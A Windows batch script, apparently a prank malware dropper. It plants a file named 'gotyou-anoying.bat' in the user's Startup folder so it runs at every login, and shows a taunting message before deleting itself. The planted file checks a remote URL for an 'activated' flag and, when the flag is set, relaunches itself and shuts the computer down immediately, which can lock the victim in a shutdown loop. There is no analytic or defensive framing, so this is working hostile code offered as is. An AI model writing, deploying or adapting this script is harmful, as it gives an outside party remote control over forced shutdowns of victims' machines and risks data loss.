@echo off
set delstarter=%cd%
cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
echo @echo off > gotyou-anoying.bat
echo curl -sL https://jsws.cinterop.de/custom/viract.txt ^| find /i "activated" >> gotyou-anoying.bat
echo if not errorlevel 1 ( >> gotyou-anoying.bat
echo cd "%%~dp0" >> gotyou-anoying.bat
echo start gotyou-anoying.bat >> gotyou-anoying.bat
echo timeout /t 7 >> gotyou-anoying.bat
echo curl -sL https://jsws.cinterop.de/custom/viract.txt ^| find /i "activated" >> gotyou-anoying.bat
echo if not errorlevel 1 ( >> gotyou-anoying.bat
echo shutdown -s -t 0 ) else ( del gotyou-anoying.bat ) ) else ( del gotyou-anoying.bat ) >> gotyou-anoying.bat
msg * "HAHA...Got you"
timeout /t 3
start gotyou-anoying.bat
cd %delstarter%
del Autoreboot-death.bat
